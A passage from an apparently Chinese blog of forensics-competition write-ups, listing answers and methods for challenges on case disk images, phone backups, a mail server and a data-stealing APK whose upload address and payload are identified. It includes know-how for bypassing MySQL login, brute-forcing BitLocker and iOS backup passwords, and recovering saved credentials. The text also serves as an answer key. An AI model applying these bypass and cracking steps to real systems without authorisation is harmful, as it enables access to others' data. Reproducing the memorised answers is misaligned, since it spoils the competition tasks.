src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291819312.png" alt="image-20240129181924255"></p><p>稳妥起见 在<code>my.ini</code>中加上<code>skip-grant-tables</code>来绕过mysql登陆密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291821215.png" alt="image-20240129182124185"></p><p>在使用navicat连接本地数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822799.png" alt="image-20240129182228758"></p><p>看到有5个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822440.png" alt="image-20240129182248420"></p><h4 id="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"><a href="#3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）" class="headerlink" title="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"></a>3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）</h4><p>在人员数据库的salaries_list表中使用sql语句进行查询</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291835071.png" alt="image-20240129183541039"></p><pre><code> 488313</code></pre><h4 id="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"><a href="#4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）" class="headerlink" title="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"></a>4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）</h4><pre><code>1486</code></pre><p>还是使用sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291856806.png" alt="image-20240129185651769"></p><h3 id="邮箱服务器"><a href="#邮箱服务器" class="headerlink" title="邮箱服务器"></a>邮箱服务器</h3><p>在计算机下载应用里面找到一个<code>hMailServer</code> 这应该就是邮箱服务器了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292012799.png" alt="image-20240129201243760"></p><h4 id="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"><a href="#1、请问邮箱服务器的登录密码是多少。（标准格式：admin）" class="headerlink" title="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"></a>1、请问邮箱服务器的登录密码是多少。（标准格式：admin）</h4><pre><code>900110</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013406.png" alt="image-20240130001300369"></p><h4 id="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"><a href="#2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）" class="headerlink" title="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"></a>2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>这里从取证软件里面看会少一个 直接在hMailServer里面找 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292351857.png" alt="image-20240129235112822"></p><h4 id="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"><a href="#3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）" class="headerlink" title="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"></a>3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>登陆邮件服务器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013359.png" alt="image-20240130001331304"></p><p>使用密码900110 打开Domains 看到三个域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300014031.png" alt="image-20240130001411983"></p><h4 id="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"><a href="#4、请问约定见面的地点在哪里。（标准格式：太阳路668号）" class="headerlink" title="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"></a>4、请问约定见面的地点在哪里。（标准格式：太阳路668号）</h4><pre><code>中国路999号</code></pre><p>misc做法 在邮件记录里面找到一个附件<code>待会见.jpg</code>  直接修改图片的宽高就可以看到在图片下方有见面地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328465.png" alt="image-20240128232840426"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328916.png" alt="image-20240128232852733"></p><h2 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h2><h4 id="1、APP包名是多少。（标准格式：com-xxx-xxx）"><a href="#1、APP包名是多少。（标准格式：com-xxx-xxx）" class="headerlink" title="1、APP包名是多少。（标准格式：com.xxx.xxx）"></a>1、APP包名是多少。（标准格式：com.xxx.xxx）</h4><pre><code>com.example.readeveryday</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291921364.png" alt="image-20240129192135281"></p><h4 id="2、apk的主函数名是多少。（标准格式：comlongxin）"><a href="#2、apk的主函数名是多少。（标准格式：comlongxin）" class="headerlink" title="2、apk的主函数名是多少。（标准格式：comlongxin）"></a>2、apk的主函数名是多少。（标准格式：comlongxin）</h4><pre><code>StartShow</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291923411.png" alt="image-20240129192309348"></p><h4 id="3、apk的签名算法是什么。（标准格式：xxx）"><a href="#3、apk的签名算法是什么。（标准格式：xxx）" class="headerlink" title="3、apk的签名算法是什么。（标准格式：xxx）"></a>3、apk的签名算法是什么。（标准格式：xxx）</h4><pre><code>SHA1withRSA</code></pre><p>这个其实在雷电的分析结果里面有 是<code>SHA1-RSA</code> 但还是以jadx的分析结果为准</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291927610.png" alt="image-20240129192746538"></p><h4 id="4、apk的应用版本是多少。（标准格式：1-2）"><a href="#4、apk的应用版本是多少。（标准格式：1-2）" class="headerlink" title="4、apk的应用版本是多少。（标准格式：1.2）"></a>4、apk的应用版本是多少。（标准格式：1.2）</h4><pre><code>1.0</code></pre><h4 id="5、请判断该apk是否需要联网。（标准格式：是-x2F-否）"><a href="#5、请判断该apk是否需要联网。（标准格式：是-x2F-否）" class="headerlink" title="5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）"></a>5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）</h4><pre><code>是</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291928207.png" alt="image-20240129192825171"></p><h4 id="6、APK回传地址？（标准格式：127-0-0-1-12345）"><a href="#6、APK回传地址？（标准格式：127-0-0-1-12345）" class="headerlink" title="6、APK回传地址？（标准格式：127.0.0.1:12345）"></a>6、APK回传地址？（标准格式：127.0.0.1:12345）</h4><pre><code>http://10.0.102.135:8888/api/demo</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291936089.png" alt="image-20240129193638046"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937786.png" alt="image-20240129193700747"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937800.png" alt="image-20240129193729740"></p><p>沙箱和雷电都分析出来一个内网地址 在jadx里面翻主函数的代码 也能找到一个<code>checkAndUpload</code>函数 在里面找到同样的地址</p><h4 id="7、APK回传数据文件名称是什么。（标准格式：1-txt）"><a href="#7、APK回传数据文件名称是什么。（标准格式：1-txt）" class="headerlink" title="7、APK回传数据文件名称是什么。（标准格式：1.txt）"></a>7、APK回传数据文件名称是什么。（标准格式：1.txt）</h4><pre><code>Readdata.zip</code></pre><p>接上题 在同样的函数里面找到这个文件</p><p>也可以使用雷电抓包看回传的文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302217534.png" alt="image-20240130221730474"></p><p>选择代理模式抓包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302246956.png" alt="image-20240130224622886"></p><p>找到回传的文件名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302251601.png" alt="image-20240130225117514"></p><h4 id="8、APK回传数据加密密码是多少。（标准格式：admin）"><a href="#8、APK回传数据加密密码是多少。（标准格式：admin）" class="headerlink" title="8、APK回传数据加密密码是多少。（标准格式：admin）"></a>8、APK回传数据加密密码是多少。（标准格式：admin）</h4><pre><code>19_08.05r</code></pre><p>在<code>EncryFile</code>函数里面找到加密密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291940534.png" alt="image-20240129194032489"></p><h4 id="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"><a href="#9、APK发送回后台服务器的数据包含以下哪些内容？（多选）" class="headerlink" title="9、APK发送回后台服务器的数据包含以下哪些内容？（多选）"></a>9、APK发送回后台服务器的数据包含以下哪些内容？（多选）</h4><pre><code>A．手机通讯录B.手机短信C.相册D.GPS定位信息E.手机应用列表</code></pre><pre><code>ABE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291945666.png" alt="image-20240129194512621"></p><p>分别对应 短信、通讯录、手机应用</p><p>也可以分析第7题抓包得到的压缩包 解压密码已经在第8题得到了 直接解压回传的<code>Readdata.zip </code>得到readdata.xml 这里面有提到通讯录、手机短信、应用列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302255859.png" alt="image-20240130225514767"></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023第四届中科实数杯</title>
      <link href="/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/"/>
      <url>/2024/01/13/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023中科实数杯"><a href="#2023中科实数杯" class="headerlink" title="2023中科实数杯"></a>2023中科实数杯</h1><p>当时比赛在学校的训练馆里面 巨冷 直接被造成魔法伤害 还由于笔记本内存太小 火眼取证大师根本跑不动 导致最后时间很紧 队友爆出来bitlocker密钥的时候只剩20分钟了 sb答题系统还自动提交了我们答题少的那一台笔记本的答案 总之就是很憋屈的一场比赛(生理和心理上)</p><h2 id="案情介绍"><a href="#案情介绍" class="headerlink" title="案情介绍"></a>案情介绍</h2><pre><code>受害人报案，其被嫌疑人王某多次通过微信进行诈骗，对受害人手机进行快采后，公安机关根据已有线索，发现可能存在多个受害人被该嫌疑人通过同样的方式进行诈骗。公安机关现已将嫌疑人iphone手机、红米手机、电脑进行备份、镜像。检材1：嫌疑人的计算机磁盘镜像 检材2：嫌疑人的iphone备份数据 检材3：嫌疑人的计算机内存镜像 检材4：嫌疑人的红米手机备份数据</code></pre><h2 id="检材一：嫌疑人计算机"><a href="#检材一：嫌疑人计算机" class="headerlink" title="检材一：嫌疑人计算机"></a>检材一：嫌疑人计算机</h2><p>使用取证软件分析之后发现这个计算机镜像的C盘被锁了 基本上就是什么也取不出来 但是好在我们有内存文件</p><p>使用取证大师里面的内存镜像解析工具 解析一波bitlocker密码 很快就得到了bitlocker密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121857921.png" alt="image-20240112185721851"></p><p>使用密钥文件就可以在取证大师里面解密C盘 先进行取证 下面在使用passwordkit结合0计算机镜像和内存文件慢慢爆破bitlocker密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121859123.png" alt="image-20240112185911076"></p><h3 id="1-检材一硬盘的MD5值为"><a href="#1-检材一硬盘的MD5值为" class="headerlink" title="1.检材一硬盘的MD5值为"></a>1.检材一硬盘的MD5值为</h3><pre><code>80518BC0DBF3315F806E9EDF7EE13C12 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401121908962.png" alt="image-20240112190852922"></p><h3 id="2-检材一bitlocker的恢复密钥是多少？"><a href="#2-检材一bitlocker的恢复密钥是多少？" class="headerlink" title="2. 检材一bitlocker的恢复密钥是多少？"></a>2. 检材一bitlocker的恢复密钥是多少？</h3><p>使用passwordkit结合计算机镜像和内存镜像爆破出bitlocker密码为</p><pre><code>585805-292292-462539-352495-691284-509212-527219-095942</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122033157.png" alt="image-20240112203304074"></p><h3 id="3-检材一镜像中用户最近一次打开的文件名是什么？"><a href="#3-检材一镜像中用户最近一次打开的文件名是什么？" class="headerlink" title="3.检材一镜像中用户最近一次打开的文件名是什么？"></a>3.检材一镜像中用户最近一次打开的文件名是什么？</h3><p>使用爆破出的bitlocker密钥解密磁盘分区 使用取证工具进行分析</p><p>在火眼——最近访问的项目——筛选最后访问时间(按降序排列) </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122254418.png" alt="image-20240112225407340"></p><p>注意是最近一次打开的文件名 所以是第二行的<code>列表.xlsx</code></p><h3 id="4-检材一硬盘系统分区的起始位置？"><a href="#4-检材一硬盘系统分区的起始位置？" class="headerlink" title="4.检材一硬盘系统分区的起始位置？"></a>4.检材一硬盘系统分区的起始位置？</h3><pre><code>332398592</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122305799.png" alt="image-20240112230511764"></p><h3 id="5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）"><a href="#5、检材一系统的版本号是多少（格式：x-x-x-x）（1分）" class="headerlink" title="5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）"></a>5、检材一系统的版本号是多少（格式：x.x.x.x）（1分）</h3><pre><code>10.0.19042.508</code></pre><p>这道题还是官方wp写的方法更巧妙一点</p><p>我们在取证软件中看到的是<code>当前版本和当前build版本</code> 但这个并不全</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122308991.png" alt="image-20240112230834957"></p><p>但是题目的格式应该是有四位 那我们仿真起计算机 打开命令行就可以看到完整的系统版本号了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122329442.png" alt="image-20240112232959406"></p><h3 id="6、检材一回收站中的文件被删除前的路径（2分）"><a href="#6、检材一回收站中的文件被删除前的路径（2分）" class="headerlink" title="6、检材一回收站中的文件被删除前的路径（2分）"></a>6、检材一回收站中的文件被删除前的路径（2分）</h3><pre><code>C:/Users/rd/Desktop/iTunes(12.13.0.9).exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122330209.png" alt="image-20240112233030160"></p><h3 id="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）"><a href="#7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD-HH-MM-SS）（3分）" class="headerlink" title="7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）"></a>7、检材一给出最后一次修改系统时间前的时间（格式：YYYY-MM-DD HH:MM:SS）（3分）</h3><pre><code>2023-12-12 16:37:12</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122332543.png" alt="image-20240112233220464"></p><h3 id="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>8、检材一最后一次远程连接本机的时间（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-11 15:57:02</code></pre><p>在取证大师帐户登陆部分看到一个外部ip 那这就是远程连接的ip了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122338825.png" alt="image-20240112233820741"></p><h3 id="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"><a href="#9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）" class="headerlink" title="9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）"></a>9、检材一Chrome浏览器最后一次搜索过的关键词是什么（2分）</h3><pre><code>常见的诈骗话术2023</code></pre><p>谷歌浏览器的搜索记录中筛选时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122341965.png" alt="image-20240112234107931"></p><h3 id="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"><a href="#10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）" class="headerlink" title="10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）"></a>10、检材一是否连接过U盘，如有，请给出U盘的SN码（2分）</h3><pre><code>FC2005927F271</code></pre><p>通过设备描述可以看出来只有aigo这个USB设备有挂载盘符 因此确定他是U盘 SN码就是设备序列号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122343246.png" alt="image-20240112234329173"></p><h3 id="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"><a href="#11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）" class="headerlink" title="11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）"></a>11、检材一Edge浏览器最早一次下载过的文件文件名是（2分）</h3><pre><code>winrar-x64-624scp.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122345049.png" alt="image-20240112234530962"></p><h3 id="12、嫌疑人访问的微博的密码的MD5值（3分）"><a href="#12、嫌疑人访问的微博的密码的MD5值（3分）" class="headerlink" title="12、嫌疑人访问的微博的密码的MD5值（3分）"></a>12、嫌疑人访问的微博的密码的MD5值（3分）</h3><pre><code>5cb42860b3b61ef6dd361ad556f48e05</code></pre><p>在谷歌浏览器中有保存微博账号登陆的密码 在进行md5加密即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347382.png" alt="image-20240112234742310"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401122347355.png" alt="image-20240112234758315"></p><h2 id="检材二：嫌疑人的iphone备份数据"><a href="#检材二：嫌疑人的iphone备份数据" class="headerlink" title="检材二：嫌疑人的iphone备份数据"></a>检材二：嫌疑人的iphone备份数据</h2><h3 id="13、检材二备份的设备名称是什么？（1分）"><a href="#13、检材二备份的设备名称是什么？（1分）" class="headerlink" title="13、检材二备份的设备名称是什么？（1分）"></a>13、检材二备份的设备名称是什么？（1分）</h3><pre><code>“User”的 iPhone</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131746598.png" alt="image-20240113174634555"></p><h3 id="14、检材二手机的IOS系统版本是多少（1分）"><a href="#14、检材二手机的IOS系统版本是多少（1分）" class="headerlink" title="14、检材二手机的IOS系统版本是多少（1分）"></a>14、检材二手机的IOS系统版本是多少（1分）</h3><pre><code>17.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131747999.png" alt="image-20240113174744955"></p><h3 id="15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）"><a href="#15、检材二备份的时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（1分）" class="headerlink" title="15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）"></a>15、检材二备份的时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（1分）</h3><pre><code>2023-12-09 15:02:28</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131752105.png" alt="image-20240113175248067"></p><h3 id="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>16、嫌疑人iphone手机给号码“13502409024”最后一次打电话的时间是。（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><p>在分析计算机镜像的时候 火眼识别出有一个ios的嵌套备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132203317.png" alt="image-20240113220317260"></p><p>我们跳转源文件 将这个备份提取出来 放到火眼里面在分析一下 提示是加密备份 需要密码</p><p>使用passwordkit进行爆破<code>Manifest.pslist</code>文件</p><p>爆破的范围我们在使用passwordkit分析内存镜像的时候可以看到是五位纯数字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132217694.png" alt="image-20240113221736632"></p><p>最后爆破可得解密密钥为<code>25922</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132222482.png" alt="image-20240113222238398"></p><p>得到解密密钥之后 在火眼中进行解密在进行分析</p><p>找到通话记录 给号码“13502409024”最后一次打电话的时间是</p><pre><code>2023-12-04 13:18:50</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132236651.png" alt="image-20240113223657605"></p><h3 id="17、检材二使用过的号码ICCID是多少。（2分）"><a href="#17、检材二使用过的号码ICCID是多少。（2分）" class="headerlink" title="17、检材二使用过的号码ICCID是多少。（2分）"></a>17、检材二使用过的号码ICCID是多少。（2分）</h3><pre><code>89860000191997734908</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132238303.png" alt="image-20240113223800264"></p><h3 id="18、检材二手机中高德地图最后搜索的地址。（2分）"><a href="#18、检材二手机中高德地图最后搜索的地址。（2分）" class="headerlink" title="18、检材二手机中高德地图最后搜索的地址。（2分）"></a>18、检材二手机中高德地图最后搜索的地址。（2分）</h3><pre><code>万达广场(南沙店)双山大道3号</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757076.png" alt="image-20240113175717029"></p><h3 id="19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分"><a href="#19、检材二手机最后一次登陆-x2F-注册“HotsCoin”的时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分" class="headerlink" title="19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)"></a>19、检材二手机最后一次登陆&#x2F;注册“HotsCoin”的时间是（格式：YYYY-MM-DD HH:MM:SS）（2分)</h3><pre><code>2023-12-04 13:28:14</code></pre><p>使用短信验证码登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132240226.png" alt="image-20240113224039190"></p><h3 id="20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#20、检材二手机中照片“IMG-0002”的拍摄时间是（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>20、检材二手机中照片“IMG_0002”的拍摄时间是（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-06 11:08:30</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401131757553.png" alt="image-20240113175751507"></p><h3 id="21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）"><a href="#21、检材二中“小西米语音”app的Bundle-ID是什么？-（2分）" class="headerlink" title="21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）"></a>21、检材二中“小西米语音”app的Bundle ID是什么？ （2分）</h3><p>bundle id就是系统APP唯一识别id 其实就是app的包名</p><pre><code>com.titashow.tangliao</code></pre><h3 id="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"><a href="#22、检材二中浏览器最后一次搜索的关键词是什么？（2分）" class="headerlink" title="22、检材二中浏览器最后一次搜索的关键词是什么？（2分）"></a>22、检材二中浏览器最后一次搜索的关键词是什么？（2分）</h3><pre><code>ios备份密码忘了怎么办 五位纯数字</code></pre><p>Safari 的搜索记录保存在 <code>APP-Domain-com.apple.mobilesafari/Libarary/Preferences/com.apple.mobilesafari.plist</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142314680.png" alt="image-20240114231416643"></p><h3 id="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"><a href="#23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）" class="headerlink" title="23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）"></a>23、嫌疑人和洗钱人员约定电子钱包的品牌是什么，如有多个用顿号分隔。（3分）</h3><pre><code>imToken、Bitcoin</code></pre><p>检材二中的微信聊天记录中并没有关于约定电子钱包的信息 在检材二这台苹果手机中下载的软件也只有UC浏览器 微信 高德地图 小西米语音 Hostcoin 那可以提供聊天记录的也就只有小西米语音了</p><p>小西米语音的聊天记录存放在<code>00008030-001619320C68802E\其他应用小西米语音—在线连麦社交平台\文件分类\SQLite文件\其他\im5db</code>中 我们使用navicat打开数据库 在<code>massage</code>表中可以看到聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142323868.png" alt="image-20240114232317815"></p><p>提到的电子钱包品牌是imToken和Bitcoin</p><h3 id="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"><a href="#24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）" class="headerlink" title="24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）"></a>24、嫌疑人和洗钱人员约定电子钱包的金额比例是什么。（3分）</h3><pre><code>0.2</code></pre><p>接上题  比例是0.2</p><h2 id="检材三：计算机内存镜像"><a href="#检材三：计算机内存镜像" class="headerlink" title="检材三：计算机内存镜像"></a>检材三：计算机内存镜像</h2><h3 id="25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）"><a href="#25、检材三中进程“FTK-Imager-exe”的PID是多少？（2分）" class="headerlink" title="25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）"></a>25、检材三中进程“FTK Imager.exe”的PID是多少？（2分）</h3><pre><code>11328</code></pre><p>使用火眼的内存镜像分析工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132302766.png" alt="image-20240113230212675"></p><h3 id="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）"><a href="#26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD-HH-MM-SS）（2分）" class="headerlink" title="26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）"></a>26、检材三中显示的系统时间是多少？（格式：YYYY-MM-DD HH:MM:SS）（2分）</h3><pre><code>2023-12-12 04:06:25</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132303631.png" alt="image-20240113230310542"></p><h3 id="27、检材三中记录的当前系统ip是多少？（2分）"><a href="#27、检材三中记录的当前系统ip是多少？（2分）" class="headerlink" title="27、检材三中记录的当前系统ip是多少？（2分）"></a>27、检材三中记录的当前系统ip是多少？（2分）</h3><pre><code>172.18.7.229</code></pre><p>使用取证大师的内存镜像解析工具分析内存镜像的网络连接情况 找到本地ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132312091.png" alt="image-20240113231203050"></p><h2 id="检材四：嫌疑人的红米手机备份数据"><a href="#检材四：嫌疑人的红米手机备份数据" class="headerlink" title="检材四：嫌疑人的红米手机备份数据"></a>检材四：嫌疑人的红米手机备份数据</h2><p>检材四是红米手机备份文件 给的文件夹里面有手机应用的备份bak文件还有一个综述性文件<code>descript.xml</code> 里面内容是备份应用和备份手机的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141733567.png" alt="image-20240114173334496"></p><p>应用具体信息应该就在.bak文件中 使用7zip可以将这些bak文件解压 在解压后的文件夹中还可以找到对应app的安装包apk文件 类似下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141813778.png" alt="image-20240114181324713"></p><p>将全部的应用bak文件使用7zip解压完毕 就可以将文件集合直接丢到火眼里面自动分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141814278.png" alt="image-20240114181425183"></p><h3 id="28、检材四中迅雷下载过的文件名是什么？（1分）"><a href="#28、检材四中迅雷下载过的文件名是什么？（1分）" class="headerlink" title="28、检材四中迅雷下载过的文件名是什么？（1分）"></a>28、检材四中迅雷下载过的文件名是什么？（1分）</h3><pre><code>《向银河靠近》.txt</code></pre><p>找到迅雷下载过的文件名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141815830.png" alt="image-20240114181550701"></p><h3 id="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"><a href="#29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）" class="headerlink" title="29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）"></a>29、检材四中安装了哪些可是实现翻墙（VPN）功能的app？（1分）</h3><pre><code>Clash</code></pre><p>分析出来的应用中只有Clash一款vpn应用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141817044.png" alt="image-20240114181721956"></p><h3 id="30、检材四备份的设备系统版本是多少？（1分）"><a href="#30、检材四备份的设备系统版本是多少？（1分）" class="headerlink" title="30、检材四备份的设备系统版本是多少？（1分）"></a>30、检材四备份的设备系统版本是多少？（1分）</h3><pre><code>V14.0.2.0.TKSCNXM</code></pre><p>在<code>descript.xml</code>文件里面找到设备系统版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141818848.png" 